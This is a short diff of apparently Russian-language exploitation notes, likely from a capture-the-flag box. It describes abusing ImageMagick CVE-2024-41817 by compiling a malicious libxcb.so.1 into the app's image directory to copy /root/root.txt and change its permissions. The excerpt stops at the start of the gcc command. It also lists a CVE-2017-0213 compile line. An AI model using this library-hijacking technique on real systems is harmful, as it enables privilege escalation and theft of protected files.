@@ -16,6 +16,9 @@ cl CVE-2017-0213.cpp /DUNICODE /D_UNICODE /EHsc
 
 
 # ImageMagick---> CVE-2024–41817, которая позволяет выполнять произвольный код, загружая вредоносные общие библиотеки в текущий рабочий каталог при выполнении ImageMagick:
+
+   Из identify_images.sh мы знаем, что рабочий каталог находится в /opt/app/static/assets/images/. Давайте создадим там общую библиотеку, которая копирует файл /root/root.txt и изменяет его права доступа:
+    
     gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
     #include <stdio.h>
     #include <stdlib.h>
